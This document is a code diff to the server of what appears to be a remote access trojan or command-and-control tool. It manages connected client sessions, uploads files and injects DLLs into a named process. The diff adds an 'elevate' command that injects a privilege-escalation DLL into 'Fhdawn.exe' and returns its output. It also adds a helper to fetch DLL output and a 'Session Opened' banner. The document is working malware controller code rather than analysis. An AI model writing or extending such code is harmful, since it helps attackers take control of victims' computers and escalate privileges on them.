@@ -36,12 +36,14 @@ class ClientManage:
 
     def clearLog(self):
         del log[:]
+
     def returnClientInfo(self):
         """
         return basic client information
         """
         location = clients.index(self.client_socket)
         return "Index : " + str(location) + " - IP : " + str(iplist[location]) + " - " + hostList[location]
+
     def SendData(self, data):
         try:
             self.client_socket.send(data.encode())
@@ -220,12 +222,12 @@ class ClientManage:
                         print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                         self.WaitForReply()
                 except FileNotFoundError:
-                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
+                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file = mfile))
                 except Exception as e:
                     print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
         
-        def DLLTransfer(mfile=None):
-            if(mfile == None):
+        def DLLTransfer(mfile=None, proc=None):
+            if(mfile == None and proc == None):
                 mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] DLL Path : ")
                 proc = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Process Name : ")
             try:
@@ -242,9 +244,13 @@ class ClientManage:
                     #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                     self.WaitForReply()
             except FileNotFoundError:
-                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
+                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file = mfile))
             except Exception as e:
                 print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
+
+        def DLLGetOutput():
+            self.SendData("dlloutput")
+            self.WaitForReply()
 
         while(session):
             try:
@@ -644,6 +650,13 @@ Open Ports
                     
                 elif(main == "help"):
                     print(help)
+
+                elif(main == "elevate"):
+                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
+                    DLLTransfer("payloads/elevate.dll", "Fhdawn.exe") # Inject elevate.dll in Fhdawn.exe
+                    print( Style.BRIGHT + Fore.CYAN + "[ + ] Payload Output : \n------------------\n" + Style.RESET_ALL)
+                    DLLGetOutput()
+
             except KeyboardInterrupt:
                 print("[X] Interrupt, Type exit to Exit session.")
 
@@ -881,7 +894,7 @@ def TCPServer():
         client_ip = str(addr[0]) +":"+ str(addr[1])
         iplist.append(client_ip)
         hostList.append(host)
-        print(cld.returnClientInfo())
+        print( Style.BRIGHT + Fore.GREEN + "\n[ Session Opened ] " + Style.RESET_ALL + cld.returnClientInfo())
         _thread.start_new_thread(cld.ClientThread, ())
 
 
